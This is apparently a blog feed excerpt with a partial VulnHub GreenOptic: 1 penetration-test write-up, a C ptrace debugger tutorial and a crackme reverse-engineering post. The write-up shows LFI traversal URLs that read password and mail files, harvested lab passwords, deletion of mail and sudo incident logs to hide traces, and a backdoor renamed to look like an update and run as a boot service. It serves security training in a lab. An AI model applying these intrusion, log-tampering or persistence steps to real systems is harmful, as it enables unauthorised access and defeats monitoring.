&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image37.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded both the files. The &lt;code class=&quot;highlighter-rouge&quot;&gt;file image.dd&lt;/code&gt; command indicated that image.dd was a BTRFS filesystem image, but I got an error when I tried to use btrfs to look at the file.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I took a look at the testdisk.log file as well. This file was a log for a data recovery utility called TestDisk.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image29.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I found &lt;a href=&quot;https://www.cgsecurity.org/wiki/TestDisk&quot;&gt;this&lt;/a&gt; off of Google, which seemed to be the same program referenced in the log file, and I used it on the image file.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image24.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I spent a few hours looking trying to use the TestDisk program to extract the files from the disk image file, but I had no luck. I tried to change every single setting, including the partition table type, the sector size, the number of cylinders, and the number of heads, but it appeared as though no matter what I did, I was unable to extract any useful information from the image file. As it turns out, this was a rabbit hole.&lt;/p&gt;

&lt;p&gt;I backtracked a little bit and went back to the login page I found in the /account directory. I noticed that there was an “include” parameter in the URL, and modifying the value of this include parameter could change what was shown on the website. By travelling to http://192.168.56.19/account/index.php?include=../../../../../../../../etc/passwd, I was able to read the contents of /etc/passwd. Using this file, I discovered three new usernames: sam, terry, and alex.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Suddenly, I had an idea: what if I tried to read the emails of the three users that I just found? Going to http://192.168.56.19/account/index.php?include=../../../../../../../../var/mail/terry allowed me to see terry’s emails, which included the following password: wsllsa!2&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the same idea, I was able to read sam’s email as well from http://192.168.56.19/account/index.php?include=../../../../../../../../var/mail/sam. Sam’s email included the following password: HelloSunshine123&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was unable to read alex’s emails (or perhaps he didn’t have any emails). I tried to use the usernames and passwords that I acquired in every login page that I saw earlier, but none of them worked. I couldn’t read /etc/shadow using the LFI, even after I tried common tricks like putting a NULL byte at the end or base64 encoding it. I spun up a web server on my host machine and attempted to exploit an &lt;a href=&quot;https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/&quot;&gt;RFI vulnerability&lt;/a&gt;, but I was also unsuccessful at doing this as the website only allowed local files to be included. Since that didn’t work, I tried to see if I could use a &lt;a href=&quot;https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/&quot;&gt;data stream&lt;/a&gt; to execute PHP code, but that also did not work. I even tried to send an email containing PHP code to terry and sam so that I could potentially read it using the LFI and gain code execution, but something was blocking my emails from being sent.&lt;/p&gt;

&lt;p&gt;At this point, I was hours into doing this challenge, and I was hitting a wall. I wasn’t getting anywhere, so I messaged the challenge writer on discord telling him what I’ve done so far, and he sent me this back:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Have you looked at the DNS server and tried enumerating subdomains? :)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unfortunately, I had gotten so caught up with searching for vulnerabilities in the web servers that I had forgot to do some initial enumeration with the DNS server! Looking back, this was something incredibly obvious that I had missed, and there are no excuses for making such a basic enumeration mistake.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image33.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After doing the zone transfer, I had to add greenoptic.vm, websrv01.greenoptic.vm, root.greenoptic.vm, ns1.greenoptic.vm, and recoveryplan.greenoptic.vm to my hosts file. When I travelled to http://greenoptic.vm, http://websrv01.greentoptic.vm, http://root.greenoptic.vm, and http://ns1.greenoptic.vm, I was greeted with the same website as I saw before. However, when I travelled to http://recoveryplan.greenoptic.vm, I saw something different.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image20.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The website required credentials in order to view the webpage. Perhaps there was an .htpasswd file located somewhere?&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image38.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the LFI vulnerability that I found earlier, I was able to see a password hash for a user named “staff” in /var/www/.htpasswd. This hash was easy to brute force using john.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image35.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the username “staff” and the password “wheeler”, I was able to access the webpage at http://recoveryplan.greenoptic.vm. This website contained a phpBB forum that allowed staff members to post information about their company.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image34.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I clicked on the “Team Message” post made by terry. In his post, terry attached a file called “dpi.zip,” which contained a password-protected PCAP file. I was able to extract the PCAP file by using a password found earlier: HelloSunshine123&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I scrolled through the PCAP file in wireshark, and I eventually found cleartext FTP credentials for alex. His password was FewjAASD1.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After logging into alex’s FTP account, I found one file named “user.txt” in the current directory. This file did not contain any useful information aside from a motivational message that let me know that I was on the right track.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I went back onto the website and registered a user named “notahacker” using the registration form. I had to use sam@websrv01.greenoptic.vm (which I saw earlier) as the email address because the email was required to be in the greenoptic.vm domain.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After creating the account, I was able to create a new post on phpBB that was subtly titled “I’m definitely not a hacker. Just ignore this please.” I included PHP code in the body of the post, thinking that it would allow me to gain code execution on the target machine.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image31.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the website informed me that my post would not be uploaded until I had a moderator approve it.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged into phpBB as terry using “wsllsa!2” as the password. Since terry was a moderator, I was able to approve the post that I had created. Unfortunately, this did not give me any code execution, and I ended up just deleting the page. I scoured the moderator’s settings page, hoping that I could find some setting that could lead me to code execution. It took me a while to realize that I was wasting my time in another rabbit-hole; the FTP credentials that I found earlier also worked for SSH, which gave me a low-priv shell as alex!&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image41.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I setup a web server on my host machine that allowed me to easily transfer files to the target machine using wget. After doing some digging and using a few enumeration scripts, I noticed that alex was part of the wireshark group.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was interesting to me, so I executed tshark (wireshark’s command line equivalent) to look at the packets being sent.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the messages in the packet capture contained “AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28=”, which was base64 decoded as “rootASfojoj2eozxczzmedlmedASASDKoj3o”. Using “ASfojoj2eozxczzmedlmedASASDKoj3o” as the password for root allowed me to obtain root privileges.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image19.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step was to cover the tracks that I had left while doing the pentest. I went into /var/mail/sam, and I deleted the email that indicated that I created an account on the web server using his email.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had used a few privilege escalation checkers while searching for attack vectors, so I had to delete those from /tmp.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had also tried using “sudo” several times while I was logged in as alex, which caused me to receive messages saying something along the lines of “alex is not in the sudoers group. This incident will be reported.” I had to delete these incident reports from /var/mail/root.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image27.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The last step was to make sure that I could retain access to the machine even if the root password was changed for some reason. I wanted to test out the &lt;a href=&quot;https://github.com/nihaal-prasad/Basic-Linux-Backdoor&quot;&gt;backdoor&lt;/a&gt; that I recently created, so I transferred it to the target machine using wget. I also renamed the file from “backdoor_server” to “updates” to make it seem less suspicious.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image32.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I created a new service called /etc/systemd/system/update.service that would always execute /.update on boot.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image23.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, I was able to retain access to the target even if it was rebooted and the root user’s password was changed.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image25.png&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be writing up how I solved the GreenOptic: 1 challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.</summary></entry><entry><title type="html">Creating a Barebones Linux Debugger</title><link href="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Linux Debugger" /><published>2020-03-07T00:00:00-05:00</published><updated>2020-03-07T00:00:00-05:00</updated><id>http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.&lt;/p&gt;

&lt;p&gt;The first thing that we need to do is to run the program we want to debug in a separate process using fork(). The program’s name will be given as a command line argument to our debugger, and any additional arguments that we want to past to the program we are currently debugging can also be passed as arguments. Once we call fork() to make a copy of this process, we will make the child process call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_TRACEME, 0, 0, 0);&lt;/code&gt;, which will let the child process know that it is going to be debugged by the parent process. The &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace()&lt;/code&gt; function will be used throughout our code as it allows the parent process to control and observe the child process. From there, we will use execv() to actually execute the program that we want to execute. As soon as this happens, the tracee (the program being debugged) stop pause execution on a SIGTRAP, which will be used to prevent the tracee from executing any more code unless the tracer/debugger allows it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Represents the PID of the program being debugged
static int pid = 0;

// Forks this process, runs the given executable using the given arguments, and returns the PID to the parent
int run(char **argv) {
    pid = fork();

    // If statement will only execute if we are the child process
    if(pid == 0) {
        ptrace(PTRACE_TRACEME, 0, 0, 0); // Allow the parent to trace us
        execv(argv[1], &amp;amp;(argv[2])); // Execute the program we wanted to execute.
        // The tracee should stop on SIGTRAP as soon as execv() is called.
        // This will prevent the tracee from executing any code unless the tracer allows it to using ptrace()
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, the child process has the program that we want to debug loaded up into it, and it has paused execution so that we can start to take control of it as its parent process. Inside our main function, we need to obtain the program that we must run from the command line arguments and call run(). Then we will also use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL);&lt;/code&gt; on the parent process so that if the parent exits, then the child process must also exit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Main function
int main(int argc, char **argv) {
    // Make sure we have the correct number of arguments
    if(argc != 2) {
        printf(&quot;Usage: ./debug &amp;lt;program&amp;gt; &amp;lt;additional arguments&amp;gt;\n&quot;);
        exit(0);
    }

    run(argv); // Run the given executable and obtain its PID
    ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL); // Make sure that if the tracer exits, then the tracee must also exit
    debugger(pid); // Run the debugger
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The debugger() function is a function that I made to help me process commands inputted by the user. It will parse the command the user types in and calls the correct function to do the action that the user requested. I also made a print_help() function that will print out all of the possible commands that can be used.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads a line of input
void readline(char *input) {
    // Reads a line of input
    char buf[500];
    printf(&quot;&amp;gt; &quot;);
    fgets(input, 500, stdin);

    // Get rid of the '\n' character
    int len = strlen(input);
    if(len &amp;gt;= 2 &amp;amp;&amp;amp; input[len-1] == '\n') {
        input[len-1] = '\0';
    }
}

// Prints the help menu
void print_help() {
    printf(&quot;regs: Prints out the values of each register.\n&quot;);
    printf(&quot;step: Executes a single instruction.\n&quot;);
    printf(&quot;mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.\n&quot;);
    printf(&quot;quit: Closes the debugger.\n&quot;);
}

// Actual debugger code
void debugger() {
    char *input = malloc(500); // Input that the user types in

    // Loop until the user types in &quot;exit&quot;
    do {
        readline(input); // Read a command

        // Parse the command
        if(strncmp(&quot;regs&quot;, input, 5) == 0 || strncmp(&quot;r&quot;, input, 2) == 0) {
            print_regs();
        } else if(strncmp(&quot;step&quot;, input, 5) == 0 || strncmp(&quot;s&quot;, input, 2) == 0) {
            step();
        } else if(strncmp(&quot;mem &quot;, input, 4) == 0) {
            strtok(input, &quot; &quot;); // Mem should have a single input parameter, which is the memory address to read in hex
            read_mem(strtok(NULL, &quot; &quot;));
        } else if(strncmp(&quot;help&quot;, input, 5) == 0 || strncmp(&quot;h&quot;, input, 2) == 0) {
            print_help();
        }
    } while(strncmp(input, &quot;exit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;quit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;q&quot;, 2));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing that I will show you how to do is how to read the values of the registers in the debugged program. We will be using the &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs)&lt;/code&gt; function to read the values of the registers in the debugged program. The “regs” variable that we’ll use as an input parameter for this function has a type of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct user_regs_struct&lt;/code&gt;, and the ptrace() function will store the values of the registers inside of that variable. The values of the registers can then be easily read by using the regs variable (i.e. use &lt;code class=&quot;highlighter-rouge&quot;&gt;regs.rax&lt;/code&gt; to read the value of rax).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Prints out all of the register values inside of the process we're debugging
void print_regs() {
    // Create the struct that will contain all of the process' registers
    struct user_regs_struct regs;

    // Read the values of each register and store it inside of the struct
    ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs);

    // Print out each value
    printf(&quot;rip 0x%llx\n&quot;, regs.rip);
    printf(&quot;rax 0x%llx\n&quot;, regs.rax);
    printf(&quot;rbx 0x%llx\n&quot;, regs.rbx);
    printf(&quot;rcx 0x%llx\n&quot;, regs.rcx);
    printf(&quot;rdx 0x%llx\n&quot;, regs.rdx);
    printf(&quot;rsi 0x%llx\n&quot;, regs.rsi);
    printf(&quot;rdi 0x%llx\n&quot;, regs.rdi);
    printf(&quot;rsp 0x%llx\n&quot;, regs.rsp);
    printf(&quot;rbp 0x%llx\n&quot;, regs.rbp);
    printf(&quot;r8 0x%llx\n&quot;, regs.r8);
    printf(&quot;r9 0x%llx\n&quot;, regs.r9);
    printf(&quot;r10 0x%llx\n&quot;, regs.r10);
    printf(&quot;r11 0x%llx\n&quot;, regs.r11);
    printf(&quot;r12 0x%llx\n&quot;, regs.r12);
    printf(&quot;r13 0x%llx\n&quot;, regs.r13);
    printf(&quot;r14 0x%llx\n&quot;, regs.r14);
    printf(&quot;r15 0x%llx\n&quot;, regs.r15);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To read any word from memory, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_PEEKDATA, pid, addr, 0)&lt;/code&gt;, where addr is a long representing the address that we want to read from. This function will return a long variable that we can then print out in hex.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads the value at the given memory address
void read_mem(char *addr_input) {
    // Make sure that the input isn't NULL
    if(addr_input != NULL) {
        long addr = strtol(addr_input, 0, 16); // Convert the address from a hex string to a long
        long data = ptrace(PTRACE_PEEKDATA, pid, addr, 0); // Obtain the data
        printf(&quot;%lx\n&quot;, data);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Stepping through a single line of assembly code is even easier. We can just call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SINGLESTEP, pid, 0, 0);&lt;/code&gt;, which will just execute one line of code.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Steps through a single line of assembly code
void step() {
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we should have a working debugger. You can try using this to debug a basic program, and it should work just fine.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./debug todebug
&amp;gt; help
regs: Prints out the values of each register.
step: Executes a single instruction.
mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.
quit: Closes the debugger.
&amp;gt; regs
rip 0x7fcfb2eee090
rax 0x0
rbx 0x0
rcx 0x0
rdx 0x0
rsi 0x0
rdi 0x0
rsp 0x7fff2e69c670
rbp 0x0
r8 0x0
r9 0x0
r10 0x0
r11 0x0
r12 0x0
r13 0x0
r14 0x0
r15 0x0
&amp;gt; mem 0x7fcfb2eee090
f98e8e78948
&amp;gt; step
&amp;gt; r
rip 0x7fcfb2eee093
rax 0x0
rbx 0x0
rcx 0x0
rdx 0x0
rsi 0x0
rdi 0x7fff2e69c670
rsp 0x7fff2e69c670
rbp 0x0
r8 0x0
r9 0x0
r10 0x0
r11 0x0
r12 0x0
r13 0x0
r14 0x0
r15 0x0
&amp;gt; q
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.</summary></entry><entry><title type="html">Cracking Silva97’s login-cipher</title><link href="http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher.html" rel="alternate" type="text/html" title="Cracking Silva97's login-cipher" /><published>2020-02-27T00:00:00-05:00</published><updated>2020-02-27T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher</id><content type="html" xml:base="http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher.html">&lt;p&gt;Today, I am going to show you how I reverse engineered &lt;a href=&quot;https://crackmes.one/crackme/5db0ef9f33c5d46f00e2c729&quot;&gt;this binary&lt;/a&gt; and cracked the password.  First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/output.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is what the main function looks like in Ghidra. Note that I renamed some variables/functions so that the code can be easier to read.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s some interesting stuff happening here. First of all, the print() function will take an encrypted string, decrypt it, and print it out. The encryption appears to be some sort of modified caesar cipher, but I’m not going to go too in depth into this function because it does not matter. The important thing to note is that the line that says&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uVar1 = check_input(input,&quot;fhz4yhx|~g=5&quot;);&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;will check whether the given input is correct or not. If the input is correct, the check_input() function will return 0, else, it will return 1 (this can be figured out by stepping over the function in a debugger using an input value that we know is incorrect). Clearly, our goal here is to figure out what input value makes the check_input() function return 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/check_input.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The second parameter to the check_input() function contains the correct input, but in an encrypted form. The gen_character() function will decrypt the input and return a single character, and successive calls to gen_character() using 0 as the input will return the next decrypted character. The while loop in the middle of the code will check whether each input character is equal to the decrypted character that gen_character() returned. Since we now know where the correct input is being decrypted in the code, all we have to do is set a breakpoint right after the gen_character() function is executed and look at it’s return value.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/first_value.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used radare2 to step over the first call to the gen_character() function. The decrypted character is 0x63, which is returned in rax. Next, I set rip equal to the second call to the gen_character() function using “dr rip = 0x55f90fc16409”, and I stepped over that line of code to figure out what the next decrypted character is. This also ended being 0x63.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/next_value.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I once again set rip to the gen_character() function and stepped over that line of code to figure out the next decrypted character, and I repeated these steps until I figured out what all of the decrypted characters were, which are shown below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x63, 0x63, 0x73, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x34, 0x34, 0x00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I assumed 0x00 indicated that this was the end of the string and stopped after seeing it. I sent over these values to the program using python, and I was able to crack the puzzle.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &quot;print('\x63\x63\x73\x2d\x70\x61\x73\x73\x77\x64\x34\x34')&quot; | ./login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/cracked.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
